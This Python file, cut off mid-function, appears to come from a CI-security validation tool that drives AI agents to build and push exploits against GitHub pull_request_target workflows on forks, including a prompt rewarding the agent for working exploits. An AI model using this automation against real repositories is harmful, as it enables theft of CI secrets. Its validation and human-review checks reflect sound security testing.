from __future__ import annotations

import json
import inspect
import logging
import os
import random
import shutil
import subprocess
import threading
import time
import zipfile
import fnmatch
from pathlib import Path
import re
from typing import Any, Callable

from pwn_hunter_ai.ai_enumerate.prompting import render_template_file
from pwn_hunter_ai.attack.artifacts import (
    AttackArtifactsManager,
    RepositoryArtifactBundle,
)
from pwn_hunter_ai.attack.agent_runtime import (
    AttackAgentProvider,
    AttackAgentRuntime,
)
from pwn_hunter_ai.attack.gemini_cli_manager import GeminiCliRuntimeManager
from pwn_hunter_ai.attack.hookbin_client import HookbinClient
from pwn_hunter_ai.attack.openhands_manager import OpenHandsLaunchManager
from pwn_hunter_ai.attack.sandbox_manager import (
    SandboxManager,
    RepositorySandbox,
    build_workspace_git_env,
)
from pwn_hunter_ai.attack.tokens import AttackTokenLease
from pwn_hunter_ai.attack.github_token_probe import parse_pull_request_target_filters
from pwn_hunter_ai.attack.git_identity import build_git_identity_from_github_user
from pwn_hunter_ai.github_client import GitHubApiError, GitHubClient


LOGGER = logging.getLogger(__name__)
AGENT_TASK_FILENAME = "agent-task.md"
AGENT_OUTPUT_FILENAME = "agent-output.json"
LEARNINGS_FILENAME = "LEARNINGS.md"
GEMINI_CONTEXT_FILENAME = "GEMINI.md"
LOCAL_EVENT_FILENAME = "event.json"
LOCAL_SECRETS_FILENAME = ".secrets"
LOCAL_RUNNER_ENV_FILENAME = ".runner.env"
LOCAL_EXPLOIT_TEST_FILENAME = "test-exploit-locally.py"
LOCAL_ACTRC_FILENAME = ".actrc"
AGENT_RUNTIME_METADATA_FILENAME = "agent-runtime.autoexecute.json"
AGENT_LEARNING_PROMPT_FILENAME = "agent-learning-task.md"
AGENT_LEARNING_RUNTIME_METADATA_FILENAME = "agent-runtime.learning.json"
WORKFLOW_LOGS_DIRNAME = ".pwnhunter-workflow-logs"
LOG_PROMPT_MAX_CHARS = 11_000
LOG_PROMPT_HEAD_CHARS = 1_000
LOG_PROMPT_TAIL_CHARS = 10_000
RETRY_PROMPT_MAX_BYTES = 220_000
RETRY_LOG_PAYLOAD_MAX_BYTES = 140_000
RETRY_PROMPT_SECTION_MARKER = "\n\n## Previous Attempt "
HOOKBIN_POST_RUN_WAIT_SECONDS = 20.0
HOOKBIN_POST_RUN_POLL_INTERVAL_SECONDS = 2.0
HOUSEKEEPING_COMMIT_EXCLUDES = (
    AGENT_TASK_FILENAME,
    AGENT_OUTPUT_FILENAME,
    LEARNINGS_FILENAME,
    GEMINI_CONTEXT_FILENAME,
    WORKFLOW_LOGS_DIRNAME,
    ".gitignore",
    ".github/workflows",
    ".secrets",
    ".runner.env",
    "event.json",
    LOCAL_ACTRC_FILENAME,
    LOCAL_EXPLOIT_TEST_FILENAME,
)
PR_PURPOSE_EXPLOIT = "exploit"
PR_PURPOSE_TOKEN_PROBE = "token_probe"
SAFE_CONFIRMATION_ATTEMPTS = 3
PR_HEAD_SHA_SWITCH_WAIT_SECONDS = 60
PR_FETCH_VISIBILITY_MAX_SECONDS = 45.0
PR_FETCH_VISIBILITY_MAX_ATTEMPTS = 120
PR_FETCH_RETRY_BASE_SECONDS = 0.5
PR_FETCH_RETRY_MAX_SECONDS = 4.0
PR_HEAD_REFRESH_VISIBILITY_MAX_SECONDS = 8.0
FOCUSED_WORKFLOW_MISSING_GRACE_SECONDS = 30.0
NON_ACTIONABLE_PR_TARGET_TYPES = {
    "labeled",
    "unlabeled",
    "locked",
    "unlocked",
    "auto_merge_enabled",
    "auto_merge_disabled",
    "enqueued",
    "dequeued",
}
ACTIONABLE_PR_TARGET_TYPE_PRIORITY = [
    "synchronize",
    "opened",
    "reopened",
    "edited",
    "review_requested",
    "review_request_removed",
    "assigned",
    "unassigned",
    "ready_for_review",
    "converted_to_draft",
    "closed",
]
ACTIONABLE_PR_TARGET_TYPES = set(ACTIONABLE_PR_TARGET_TYPE_PRIORITY)
PATH_FILTER_TRIGGER_FILENAME = ".pwnhunter-path-trigger.txt"
PATH_FILTER_TRIGGER_NOTE = "pwnhunter deterministic path-filter trigger"
REVIEW_REQUEST_APPROVAL_BODY = "PwnHunter validation review"
EDITED_TRIGGER_MARKER = "[pwnhunter-trigger-edited]"
WORKFLOW_RUN_APPROVAL_REQUIRED_STATUSES = {"waiting"}
WORKFLOW_RUN_APPROVAL_REQUIRED_CONCLUSIONS = {"action_required"}
PROMPTS_DIR = Path(__file__).parent / "prompts"
LOCAL_EXPLOIT_TEST_TEMPLATE_PATH = PROMPTS_DIR / "test_exploit_locally.py"
SECURITY_REPORT_FOLLOW_UP_TEMPLATE_PATH = (
    PROMPTS_DIR / "security_report_follow_up.md"
)
SECURITY_REPORT_WORKSPACE_FILENAME = "REPORT.md"
LOCAL_SECRETS_TEMPLATE_PATH = Path(__file__).resolve().parents[3] / LOCAL_SECRETS_FILENAME
LOCAL_ACTRC_CONTENT = (
    "-P ubuntu-latest=ghcr.io/catthehacker/ubuntu:full-24.04\n"
    "-P ubuntu-24.04=ghcr.io/catthehacker/ubuntu:full-24.04\n"
    "-P ubuntu-22.04=ghcr.io/catthehacker/ubuntu:full-24.04\n"
    "-P ubuntu-20.04=ghcr.io/catthehacker/ubuntu:full-24.04\n"
)
LEARNING_BULLET_PATTERN = re.compile(r"^- \[(?P<repo>[^\]]+)\]\s+(?P<learning>.+)$")
GITHUB_REQUEST_ID_PATTERN = re.compile(
    r"(?:request[_ -]?id|X-GitHub-Request-Id)[=: ]+([A-Za-z0-9_-]+)"
)
OPENHANDS_LEARNINGS_PROMPT_NOTE = (
    "\n\n## Learnings Handoff\n"
    "Read `LEARNINGS.md` in the workspace before continuing. "
    "Apply only relevant prior learnings to the current repository.\n"
)
SUCCESS_LEARNING_PROMPT = (
    "Congrats! Your exploit worked!\n\n"
    "In a new conversation, you will later exploit other repositories. "
    "If you think there is an important learning that should be added to your memory, "
    "write it into `agent-output.json` using the `learning` field.\n\n"
    "Only update `learning` if it is genuinely useful for future repositories. "
    "Otherwise leave it empty."
)
_LEARNINGS_FILE_LOCK = threading.Lock()

def _has_wildcards(pattern: str) -> bool:
    return any(char in pattern for char in "*?[]")


def _read_local_exploit_test_script_template() -> str:
    try:
        return LOCAL_EXPLOIT_TEST_TEMPLATE_PATH.read_text(encoding="utf-8")
    except OSError as exc:
        raise RuntimeError(
            f"Missing local exploit test template at {LOCAL_EXPLOIT_TEST_TEMPLATE_PATH}"
        ) from exc


def _read_local_secrets_template() -> str:
    template_path = LOCAL_SECRETS_TEMPLATE_PATH
    if not template_path.exists():
        template_path = template_path.with_name(".secrets.template")
    try:
        return template_path.read_text(encoding="utf-8")
    except OSError as exc:
        raise RuntimeError(
            f"Missing local secrets template at {LOCAL_SECRETS_TEMPLATE_PATH}"
        ) from exc


class AttackExecutionService:
    def __init__(
        self,
        github_client_factory,
        hookbin_client: HookbinClient | None = None,
        artifacts_manager: AttackArtifactsManager | None = None,
        sandbox_manager: SandboxManager | None = None,
        agent_runtime: AttackAgentRuntime | None = None,
        use_host_agent_directly: bool = False,
        use_host_openhands_directly: bool = False,
        agent_provider: str = AttackAgentProvider.OPENHANDS.value,
        reviewer_candidate_tokens: list[str] | None = None,
        security_reports_dir: Path | None = None,
        generate_security_report: bool = False,
    ) -> None:
        self._github_client_factory = github_client_factory
        self._hookbin_client = hookbin_client or HookbinClient()
        self._artifacts = artifacts_manager
        self._sandbox_manager = sandbox_manager
        self._agent_runtime = agent_runtime
        self._use_host_agent_directly = (
            use_host_agent_directly or use_host_openhands_directly
        )
        self._agent_provider = AttackAgentProvider(
            (agent_provider or AttackAgentProvider.OPENHANDS.value).strip().lower()
        )
        self._active_local_test_setup: dict[str, str] | None = None
        self._reviewer_candidate_tokens = reviewer_candidate_tokens or []
        self._token_login_cache: dict[str, str | None] = {}
        self._security_reports_dir = security_reports_dir
        self._generate_security_report = generate_security_report

    def _should_use_host_agent_directly(self) -> bool:
        if self._agent_provider == AttackAgentProvider.GEMINI_CLI:
            return True
        if self._use_host_agent_directly:
            return True
        host_direct_env = os.getenv("PWNHUNTER_USE_HOST_AGENT_DIRECTLY", "").strip().lower()
        legacy_host_direct_env = os.getenv(
            "PWNHUNTER_USE_HOST_OPENHANDS_DIRECTLY", ""
        ).strip().lower()
        return host_direct_env in {
            "1",
            "true",
            "yes",
        } or legacy_host_direct_env in {
            "1",
            "true",
            "yes",
        }

    @staticmethod
    def _workspace_subprocess_env(workspace_path: Path) -> dict[str, str]:
        return build_workspace_git_env(workspace_path)

    def execute_attack(
        self,
        *,
        user_a_token: str,
        user_b_token: str,
        user_a_fork: str,
        user_b_fork: str,
        workspace_path: Path,
        default_branch: str,
        max_retries: int = 3,
        agent_runtime_base_url: str | None = None,
        agent_timeout: int = 900,
        workflow_timeout: int = 3600,
        repo_name: str = "",
        focused_workflow: str | None = None,
        focused_workflows: list[str] | None = None,
        focused_workflow_refs: list[dict[str, Any]] | None = None,
        seeded_secrets: list[str] | None = None,
        user_b_reviewer_tokens: list[str] | None = None,
        ai_analysis: dict[str, Any] | None = None,
        github_token_permissions: dict[str, Any] | None = None,
        human_review_precheck: Callable[..., dict[str, Any]] | None = None,
        human_review_precheck_metadata: dict[str, Any] | None = None,
        risk_index: int | None = None,
        shared_secrets_state_path: Path | None = None,
    ) -> dict[str, Any]:
        self._active_local_test_setup = None
        LOGGER.info(
            "Starting execute_attack: repo=%s user_a_fork=%s user_b_fork=%s workspace=%s max_retries=%s focused_workflow=%s focused_workflows=%s focused_workflow_refs=%s.",
            repo_name or "unknown-repository",
            user_a_fork,
            user_b_fork,
            workspace_path,
            max_retries,
            focused_workflow or "",
            len(focused_workflows) if isinstance(focused_workflows, list) else 0,
            len(focused_workflow_refs) if isinstance(focused_workflow_refs, list) else 0,
        )

        if human_review_precheck is not None and isinstance(ai_analysis, dict):
            precheck = human_review_precheck(
                ai_analysis=ai_analysis,
                metadata=human_review_precheck_metadata,
            )
            if precheck.get("needs_human_review") is True:
                LOGGER.info(f"Human review pre-check requested human review before execution: {precheck}")
                reason = (
                    precheck.get("reason")
                    or "Human review pre-check requested human review before execution."
                )
                return {
                    "vulnerable": False,
                    "needs_human_review": True,
                    "status": "human_review_required",
                    "reason": reason,
                    "controller_signal": {
                        "status": "needs_human_review",
                        "reason": reason,
                        "source": "gemini_human_review_precheck",
                    },
                    "human_review_precheck": precheck,
                }

        user_a_client = self._github_client_factory(user_a_token)
        user_b_client = self._github_client_factory(user_b_token)
        user_a_identity = user_a_client.get_authenticated_user()
        user_b_identity = user_b_client.get_authenticated_user()
        user_a_login = user_a_identity["login"]
        user_b_login = user_b_identity["login"]
        user_b_git_user_name, user_b_git_user_email = (
            build_git_identity_from_github_user(user_b_identity)
        )
        LOGGER.debug(
            "Resolved GitHub identities for execute_attack: user_a_login=%s user_b_login=%s user_b_git_user_name=%s user_b_git_user_email=%s.",
            user_a_login,
            user_b_login,
            user_b_git_user_name,
            user_b_git_user_email,
        )
        reviewer_candidate_tokens = (
            [
                token
                for token in user_b_reviewer_tokens
                if isinstance(token, str) and token.strip()
            ]
            if isinstance(user_b_reviewer_tokens, list)
            else list(self._reviewer_candidate_tokens)
        )
        expected_user_a_owner = self._extract_repo_owner(user_a_fork)
        expected_user_b_owner = self._extract_repo_owner(user_b_fork)
        if not expected_user_a_owner or not expected_user_b_owner:
            return self._build_execution_error_result(
                reason=(
                    "Configured fork names must be in `owner/repo` format before execution."
                ),
                error_class="owner_token_mismatch",
                failure_fingerprint="owner_token_mismatch",
            )

        fork_chain_error = self._validate_fork_chain(
            source_repo=repo_name,
            user_a_fork=user_a_fork,
            user_b_fork=user_b_fork,
            user_a_client=user_a_client,
            user_b_client=user_b_client,
        )
        if fork_chain_error:
            LOGGER.warning(
                "Aborting execute_attack due to fork chain validation failure for repo=%s: %s",
                repo_name or "unknown-repository",
                fork_chain_error,
            )
            return {
                "vulnerable": False,
                "reason": fork_chain_error,
            }

        branch_name = f"feature/temp-change-{int(time.time())}"

        sandbox_manager = self._sandbox_manager or SandboxManager()
        sandbox_create_kwargs: dict[str, Any] = {
            "repository_name": repo_name or user_b_fork,
            "workspace_path": workspace_path,
            "git_token": user_b_token,
        }
        try:
            signature = inspect.signature(sandbox_manager.create_sandbox)
            parameter_names = set(signature.parameters)
        except (TypeError, ValueError):
            parameter_names = set()
        if "git_user_name" in parameter_names:
            sandbox_create_kwargs["git_user_name"] = user_b_git_user_name
        if "git_user_email" in parameter_names:
            sandbox_create_kwargs["git_user_email"] = user_b_git_user_email
        sandbox = sandbox_manager.create_sandbox(**sandbox_create_kwargs)
        LOGGER.info(
            "Sandbox created for repo=%s at workspace=%s.",
            repo_name or user_b_fork,
            workspace_path,
        )

        try:
            clone_url = f"https://github.com/{user_b_fork}.git"
            sandbox.clone_repository(clone_url)
            LOGGER.info(
                "Cloned repository %s into workspace %s.",
                user_b_fork,
                workspace_path,
            )
            if hasattr(sandbox, "run_git"):
                # Reuse-safe baseline: reset local workspace to remote default branch
                # before parsing workflow metadata for this risk.
                sandbox.run_git(["fetch", "origin", default_branch], check=False)
                sandbox.run_git(["checkout", default_branch], check=False)
                sandbox.run_git(
                    ["reset", "--hard", f"origin/{default_branch}"],
                    check=False,
                )
                sandbox.run_git(["clean", "-fd"], check=False)
            pr_base_branch, branch_filters = self._resolve_pr_base_branch_with_filters_from_workspace(
                workspace_path=workspace_path,
                focused_workflow=focused_workflow,
                default_branch=default_branch,
            )
            pr_path_filters = self._resolve_pr_path_filters_from_workspace(
                workspace_path=workspace_path,
                focused_workflow=focused_workflow,
            )
            types_explicit, workflow_types = self._resolve_pr_target_types_from_workspace(
                workspace_path=workspace_path,
                focused_workflow=focused_workflow,
            )
            trigger_plan = self._build_pull_request_target_trigger_plan(
                types_explicit=types_explicit,
                workflow_types=workflow_types,
            )
            trigger_mode = str(trigger_plan.get("mode") or "").strip()
            actionable_trigger_types = [
                item
                for item in trigger_plan.get("actionable_types") or []
                if isinstance(item, str) and item.strip()
            ]
            explicit_types = [
                item
                for item in trigger_plan.get("explicit_types") or []
                if isinstance(item, str) and item.strip()
            ]
            non_actionable_types = [
                item
                for item in trigger_plan.get("non_actionable_types") or []
                if isinstance(item, str) and item.strip()
            ]
            LOGGER.info(
                "Resolved PR trigger plan for repo=%s: base_branch=%s trigger_mode=%s actionable_types=%s branch_filters=%s path_filters=%s.",
                repo_name or user_b_fork,
                pr_base_branch,
                trigger_mode or "default",
                actionable_trigger_types,
                branch_filters,
                pr_path_filters,
            )
            LOGGER.info(
                "attack.lifecycle %s",
                json.dumps(
                    {
                        "event": "pr_validation",
                        "repo": repo_name or user_b_fork,
                        "selected_branch": pr_base_branch,
                        "filter_source": (
                            "workflow_branch_filter"
                            if branch_filters
                            else "repository_default_branch"
                        ),
                        "branch_filters": branch_filters,
                        "path_filters": pr_path_filters,
                    },
                    sort_keys=True,
                ),
            )
            if trigger_mode == "explicit_non_actionable_only":
                reason = (
                    "Focused workflow defines explicit pull_request_target types that are "
                    "permission-gated for this controller context only: "
                    + ", ".join(non_actionable_types)
                    + ". Human review is required."
                )
                return {
                    "vulnerable": False,
                    "needs_human_review": True,
                    "status": "human_review_required",
                    "reason": reason,
                    "controller_signal": {
                        "status": "needs_human_review",
                        "reason": reason,
                        "source": "workflow_pr_target_types_non_actionable_only",
                        "types_explicit": True,
                        "types": explicit_types,
                    },
                }
            if trigger_mode == "explicit_unknown_only":
                reason = (
                    "Focused workflow defines explicit pull_request_target types, but none "
                    "are recognized/actionable by controller: "
                    + (", ".join(explicit_types) or "(none)")
                    + ". Human review is required."
                )
                return {
                    "vulnerable": False,
                    "needs_human_review": True,
                    "status": "human_review_required",
                    "reason": reason,
                    "controller_signal": {
                        "status": "needs_human_review",
                        "reason": reason,
                        "source": "workflow_pr_target_types_unknown_only",
                        "types_explicit": True,
                        "types": explicit_types,
                    },
                }
            synchronize_selected = (
                "synchronize" in actionable_trigger_types
                and "opened" not in actionable_trigger_types
            )
            opened_only_mode = (
                types_explicit
                and actionable_trigger_types == ["opened"]
            )
            if synchronize_selected:
                LOGGER.info(
                    "Workflow requires synchronize-only trigger mode for repo=%s; bootstrap PR path will be used.",
                    repo_name or user_b_fork,
                )
            elif opened_only_mode:
                LOGGER.info(
                    "Workflow uses opened-only trigger mode for repo=%s.",
                    repo_name or user_b_fork,
                )
            default_branch_matches_filters = any(
                fnmatch.fnmatch(default_branch, pattern) for pattern in branch_filters
            )
            if (
                branch_filters
                and not default_branch_matches_filters
                and _has_wildcards(pr_base_branch)
            ):
                resolved_branch, resolution_error = self._resolve_or_create_patterned_pr_base_branch(
                    client=user_a_client,
                    repo_name=user_a_fork,
                    branch_pattern=pr_base_branch,
                    source_branch=default_branch,
                    branch_token=branch_name.replace("/", "-"),
                )
                if resolved_branch is None:
                    reason = (
                        resolution_error
                        or (
                            "Focused workflow pull_request_target branch filter could not be "
                            "resolved to a concrete target branch."
                        )
                    )
                    return {
                        "vulnerable": False,
                        "needs_human_review": True,
                        "status": "human_review_required",
                        "reason": reason,
                        "controller_signal": {
                            "status": "needs_human_review",
                            "reason": reason,
                            "source": "workflow_branch_filter_validation",
                        },
                    }
                LOGGER.info(
                    "Resolved wildcard branch filter %s to concrete branch %s for repo=%s.",
                    pr_base_branch,
                    resolved_branch,
                    repo_name or user_b_fork,
                )
                pr_base_branch = resolved_branch
            if (
                not _has_wildcards(pr_base_branch)
                and not self._branch_exists(
                    client=user_a_client,
                    repo_name=user_a_fork,
                    branch=pr_base_branch,
                )
            ):
                source = "pr_target_branch_validation"
                if branch_filters and not default_branch_matches_filters:
                    source = "workflow_branch_filter_validation"
                    reason = (
                        f"Focused workflow pull_request_target branch filter selected `{pr_base_branch}`, "
                        f"but branch `{pr_base_branch}` does not exist on `{user_a_fork}`."
                    )
                else:
                    reason = (
                        f"Target branch `{pr_base_branch}` does not exist on `{user_a_fork}`."
                    )
                return {
                    "vulnerable": False,
                    "needs_human_review": True,
                    "status": "human_review_required",
                    "reason": reason,
                    "error_stage": "execution",
                    "error_class": "pr_base_validation_failed",
                    "failure_fingerprint": "pr_base_invalid",
                    "controller_signal": {
                        "status": "needs_human_review",
                        "reason": reason,
                        "source": source,
                        "selected_branch": pr_base_branch,
                        "filter_source": (
                            "workflow_branch_filter"
                            if branch_filters
                            else "repository_default_branch"
                        ),
                        "branch_exists": False,
                        "branch_filters": branch_filters,
                    },
                }
            if pr_base_branch == default_branch and hasattr(sandbox, "run_git"):
                sandbox.run_git(["fetch", "origin", default_branch], check=False)

            user_b_head_owner = user_b_fork.split("/", 1)[0]
            route_error = self._validate_pr_target(
                source_repo=repo_name,
                target_repo=user_a_fork,
                user_a_fork=user_a_fork,
                purpose=PR_PURPOSE_EXPLOIT,
            )
            if route_error:
                LOGGER.warning(
                    "Aborting execute_attack due to invalid PR route for repo=%s: %s",
                    repo_name or user_b_fork,
                    route_error,
                )
                return {
                    "vulnerable": False,
                    "reason": route_error,
                }

            sandbox.checkout_branch(branch_name)
            self._active_local_test_setup = {
                "user_b_token": user_b_token,
                "user_a_fork": user_a_fork,
                "user_b_fork": user_b_fork,
                "git_user_name": user_b_git_user_name,
                "git_user_email": user_b_git_user_email,
                "pr_base_branch": pr_base_branch,
                "focused_workflow": (
                    focused_workflow
                    if isinstance(focused_workflow, str)
                    else ""
                ),
                "head_ref": branch_name,
                "seeded_secrets": (
                    [
                        secret_name.strip()
                        for secret_name in seeded_secrets
                        if isinstance(secret_name, str) and secret_name.strip()
                    ]
                    if isinstance(seeded_secrets, list)
                    else []
                ),
                "user_a_token": user_a_token,
                "shared_secrets_state_path": (
                    str(shared_secrets_state_path)
                    if shared_secrets_state_path is not None
                    else ""
                ),
            }
            precreated_pr: dict[str, Any] | None = None
            bootstrap_commit_head_sha: str | None = None
            if synchronize_selected:
                bootstrap_marker = (
                    f".pwnhunter-pr-bootstrap-{int(time.time() * 1000)}.txt"
                )
                (workspace_path / bootstrap_marker).write_text(
                    "bootstrap synchronize trigger\n",
                    encoding="utf-8",
                )
                bootstrap_commit = self._commit_and_push_in_sandbox(
                    sandbox=sandbox,
                    branch=branch_name,
                    commit_message="Bootstrap synchronize trigger PR",
                )
                if not bootstrap_commit.get("committed"):
                    return {
                        "vulnerable": False,
                        "needs_human_review": True,
                        "status": "human_review_required",
                        "reason": (
                            "Controller failed creating bootstrap commit required for "
                            "synchronize-only pull_request_target workflow."
                        ),
                        "controller_signal": {
                            "status": "needs_human_review",
                            "reason": (
                                "Controller failed creating synchronize bootstrap commit."
                            ),
                            "source": "workflow_pr_target_synchronize_bootstrap",
                            "types_explicit": types_explicit,
                            "types": explicit_types,
                        },
                    }
                bootstrap_commit_head_sha = str(
                    bootstrap_commit.get("head_sha") or ""
                ).strip() or None
                precreated_pr, precreate_reason = self._create_or_reuse_pull_request(
                    client=user_b_client,
                    repo_name=user_a_fork,
                    title="Add temporary change",
                    body=f"Temporary change from {branch_name}",
                    head=f"{user_b_head_owner}:{branch_name}",
                    base=pr_base_branch,
                )
                if precreated_pr is None:
                    LOGGER.warning(
                        "Failed creating synchronize bootstrap PR for repo=%s: %s",
                        repo_name or user_b_fork,
                        precreate_reason or "unknown error",
                    )
                    return {
                        "vulnerable": False,
                        "reason": precreate_reason
                        or "Failed to create pull request for synchronize bootstrap.",
                    }
            self._append_required_path_filter_guidance(
                prompt_path=workspace_path.parent / AGENT_TASK_FILENAME,
                required_path_filters=pr_path_filters,
            )
            trigger_applied, trigger_error = self._ensure_required_path_filter_change(
                workspace_path=workspace_path,
                required_path_filters=pr_path_filters,
            )
            if not trigger_applied:
                return {
                    "vulnerable": False,
                    "needs_human_review": True,
                    "status": "human_review_required",
                    "reason": trigger_error
                    or (
                        "Controller failed to apply required pull_request_target path "
                        "trigger before agent execution."
                    ),
                    "controller_signal": {
                        "status": "needs_human_review",
                        "reason": trigger_error
                        or (
                            "Controller failed applying required path trigger before agent execution."
                        ),
                        "source": "workflow_pr_target_trigger_application_failed",
                        "path_filters": pr_path_filters,
                    },
                }
            self._prepare_agent_prompt_in_workspace(workspace_path)
            LOGGER.info(
                "Launching agent execution for repo=%s (provider=%s).",
                repo_name or user_b_fork,
                self._agent_provider.value,
            )
            LOGGER.info(
                "attack.lifecycle %s",
                json.dumps(
                    {
                        "event": "agent_run_start",
                        "repo": repo_name or user_b_fork,
                        "provider": self._agent_provider.value,
                        "workspace_path": str(workspace_path),
                    },
                    sort_keys=True,
                ),
            )
            agent_result = self._run_agent_with_secret_sync(
                sandbox=sandbox,
                workspace_path=workspace_path,
                timeout=agent_timeout,
                git_token=user_b_token,
            )
            agent_result = self._retry_initial_gemini_timeout_if_needed(
                initial_result=agent_result,
                sandbox=sandbox,
                workspace_path=workspace_path,
                timeout=agent_timeout,
                git_token=user_b_token,
                max_retries=max_retries,
            )
            LOGGER.info(
                "attack.lifecycle %s",
                json.dumps(
                    {
                        "event": "agent_run_end",
                        "repo": repo_name or user_b_fork,
                        "provider": self._agent_provider.value,
                        "ok": bool(agent_result.get("ok")),
                        "status": str(agent_result.get("status") or ""),
                        "exit_code": agent_result.get("exit_code"),
                    },
                    sort_keys=True,
                ),
            )
            if not agent_result["ok"]:
                agent_status = str(agent_result.get("status") or "").strip().lower()
                agent_reason = str(agent_result.get("reason") or "").strip()
                LOGGER.warning(
                    "Agent execution failed for repo=%s: status=%s exit_code=%s reason=%s.",
                    repo_name or user_b_fork,
                    agent_status or "unknown",
                    agent_result.get("exit_code"),
                    agent_reason or "n/a",
                )
                if agent_status == "skipped_node_runtime_unavailable":
                    return {
                        "vulnerable": False,
                        "status": "skipped_node_runtime_unavailable",
                        "reason": agent_reason
                        or (
                            "Gemini CLI skipped because Node.js >= 20 was unavailable "
                            "and nvm could not activate node 24, 22, or 20."
                        ),
                        "agent_exit_code": agent_result["exit_code"],
                    }

                failure_reason = agent_reason or "Agent execution failed."
                if self._is_retryable_initial_gemini_timeout(
                    workspace_path=workspace_path
                ):
                    failure_reason = "Agent execution timed out after retries."
                return {
                    "vulnerable": False,
                    "needs_human_review": True,
                    "status": "human_review_required",
                    "reason": failure_reason,
                    "agent_exit_code": agent_result["exit_code"],
                }

            controller_signal = self._read_controller_signal_from_sandbox(sandbox)
            if controller_signal is not None:
                status = str(controller_signal.get("status") or "").strip()
                LOGGER.info(
                    "Controller signal received for repo=%s: status=%s.",
                    repo_name or user_b_fork,
                    status or "unknown",
                )
                if status == "not_vulnerable":
                    safe_result = self._confirm_not_vulnerable_with_fresh_conversations(
                        sandbox=sandbox,
                        workspace_path=workspace_path,
                        timeout=agent_timeout,
                        git_token=user_b_token,
                        initial_signal=controller_signal,
                    )
                    if safe_result is not None:
                        return safe_result
                if status in {"needs_human_review", "human_review_required"}:
                    reason = controller_signal.get("reason") or (
                        "Agent requested human review to continue validation."
                    )
                    required_resources = controller_signal.get("required_resources")
                    blocked_on = controller_signal.get("blocked_on")
                    LOGGER.info(
                        "Agent requested human review for repository: %s", reason
                    )
                    result = {
                        "vulnerable": False,
                        "needs_human_review": True,
                        "status": "human_review_required",
                        "reason": reason,
                        "controller_signal": controller_signal,
                    }
                    if required_resources is not None:
                        result["required_resources"] = required_resources
                    if blocked_on is not None:
                        result["blocked_on"] = blocked_on
                    return result

            commit_result = self._commit_and_push_in_sandbox(
                sandbox=sandbox,
                branch=branch_name,
                workspace_path=workspace_path,
                required_path_filters=pr_path_filters,
            )
            LOGGER.info(
                "Initial commit/push outcome for repo=%s: committed=%s head_sha=%s.",
                repo_name or user_b_fork,
                bool(commit_result.get("committed")),
                str(commit_result.get("head_sha") or "").strip() or "n/a",
            )

            if not commit_result.get("committed"):
                if not self._sandbox_has_any_changes(sandbox):
                    LOGGER.warning(
                        "No changes committed by controller: repository has no file changes. "
                        "Requesting Agent retry."
                    )
                    committed_after_retry = False
                    no_change_retry_attempts = max(1, max_retries - 1)
                    for retry_attempt in range(1, no_change_retry_attempts + 1):
                        retry_result = self._retry_after_no_changes(
                            workspace_path=workspace_path,
                            sandbox=sandbox,
                            branch_name=branch_name,
                            attempt=retry_attempt,
                            agent_timeout=agent_timeout,
                            git_token=user_b_token,
                            required_path_filters=pr_path_filters,
                        )
                        committed_after_retry = bool(retry_result.get("committed"))
                        if committed_after_retry:
                            break
                        retry_signal = retry_result.get("controller_signal")
                        if isinstance(retry_signal, dict):
                            status = str(retry_signal.get("status") or "").strip()
                            if status == "not_vulnerable":
                                safe_result = self._confirm_not_vulnerable_with_fresh_conversations(
                                    sandbox=sandbox,
                                    workspace_path=workspace_path,
                                    timeout=agent_timeout,
                                    git_token=user_b_token,
                                    initial_signal=retry_signal,
                                )
                                if safe_result is not None:
                                    return safe_result
                            if status in {"needs_human_review", "human_review_required"}:
                                reason = retry_signal.get("reason") or (
                                    "Agent requested human review to continue validation."
                                )
                                result = {
                                    "vulnerable": False,
                                    "needs_human_review": True,
                                    "status": "human_review_required",
                                    "reason": reason,
                                    "controller_signal": retry_signal,
                                }
                                required_resources = retry_signal.get("required_resources")
                                blocked_on = retry_signal.get("blocked_on")
                                if required_resources is not None:
                                    result["required_resources"] = required_resources
                                if blocked_on is not None:
                                    result["blocked_on"] = blocked_on
                                return result
                    if not committed_after_retry:
                        return {
                            "vulnerable": False,
                            "reason": (
                                "Agent produced no code changes and did not provide a "
                                "controller decision after retries."
                            ),
                        }

                LOGGER.warning(
                    "No changes committed by controller: repository has changes but "
                    "no eligible staged files. Requesting Agent retry."
                )
                committed_after_retry = False
                non_committable_retry_attempts = max(1, max_retries - 1)
                for retry_attempt in range(1, non_committable_retry_attempts + 1):
                    retry_result = self._retry_after_non_committable_changes(
                        workspace_path=workspace_path,
                        sandbox=sandbox,
                        branch_name=branch_name,
                        attempt=retry_attempt,
                        agent_timeout=agent_timeout,
                        git_token=user_b_token,
                        required_path_filters=pr_path_filters,
                    )
                    committed_after_retry = bool(retry_result.get("committed"))
                    if committed_after_retry:
                        break
                    retry_signal = retry_result.get("controller_signal")
                    if isinstance(retry_signal, dict):
                        status = str(retry_signal.get("status") or "").strip()
                        if status == "not_vulnerable":
                            safe_result = self._confirm_not_vulnerable_with_fresh_conversations(
                                sandbox=sandbox,
                                workspace_path=workspace_path,
                                timeout=agent_timeout,
                                git_token=user_b_token,
                                initial_signal=retry_signal,
                            )
                            if safe_result is not None:
                                return safe_result
                        if status in {"needs_human_review", "human_review_required"}:
                            reason = retry_signal.get("reason") or (
                                "Agent requested human review to continue validation."
                            )
                            result = {
                                "vulnerable": False,
                                "needs_human_review": True,
                                "status": "human_review_required",
                                "reason": reason,
                                "controller_signal": retry_signal,
                            }
                            required_resources = retry_signal.get("required_resources")
                            blocked_on = retry_signal.get("blocked_on")
                            if required_resources is not None:
                                result["required_resources"] = required_resources
                            if blocked_on is not None:
                                result["blocked_on"] = blocked_on
                            return result
                if not committed_after_retry:
                    return {
                        "vulnerable": False,
                        "needs_human_review": True,
                        "status": "human_review_required",
                        "reason": (
                            "Repository changed, but controller could not commit any "
                            "eligible files after retries."
                        ),
                        "controller_signal": {
                            "status": "needs_human_review",
                            "reason": (
                                "Repository changed, but controller could not commit any "
                                "eligible files after retries."
                            ),
                            "source": "non_committable_changes_after_retries",
                        },
                    }
            preferred_monitor_head_sha = str(
                commit_result.get("head_sha") or ""
            ).strip() or None

            pr: dict[str, Any] | None = precreated_pr
            pr_creation_reason: str | None = None
            if pr is None:
                for pr_attempt in range(1, max_retries + 1):
                    LOGGER.info(
                        "Creating pull request for repo=%s (attempt %s/%s, opened_only_mode=%s).",
                        repo_name or user_b_fork,
                        pr_attempt,
                        max_retries,
                        opened_only_mode,
                    )
                    if opened_only_mode:
                        pr, pr_creation_reason = self._create_fresh_pull_request(
                            client=user_b_client,
                            repo_name=user_a_fork,
                            title="Add temporary change",
                            body=f"Temporary change from {branch_name}",
